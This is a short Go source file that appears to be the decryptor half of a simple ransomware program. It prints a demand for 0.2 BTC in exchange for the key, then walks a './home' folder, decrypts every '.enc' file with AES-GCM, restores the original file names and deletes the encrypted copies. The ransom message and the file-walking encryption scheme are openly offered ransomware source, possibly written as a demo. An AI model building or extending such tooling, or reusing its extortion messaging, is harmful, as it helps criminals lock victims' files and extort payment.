package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func check(e error) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Error Recovery:", r)
		}
	}()
	if e != nil {
		panic(e)
	}
}

func main()  {
	fmt.Println("Please send me 0.2 btc and I will send you the key :)")
	fmt.Print("Key: ")
	var key string
	fmt.Scanln(&key)

	// Initialize AES in GCM mode
	block, err := aes.NewCipher([]byte(key))
	check(err)
	gcm, err := cipher.NewGCM(block)
	check(err)

	// looping through target files
	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
		// skip if directory
		if !info.IsDir() && filepath.Ext(path) == ".enc" {
			fmt.Println("Decrypting " + path + "...")

			// read file contents
			encrypted, err := os.ReadFile(path)
			check(err)
			
			// Decrypt bytes
			nonce := encrypted[:gcm.NonceSize()]
			encrypted = encrypted[gcm.NonceSize():]
			original, err := gcm.Open(nil,nonce,encrypted,nil)
			check(err)
			
			// write decrypted contents
			filename := strings.TrimSuffix(path,".enc")
			err = os.WriteFile(filename, original, 0666)
			check(err)
			os.Remove(path) // delete the encrypted file	
		}
		return nil
	})
}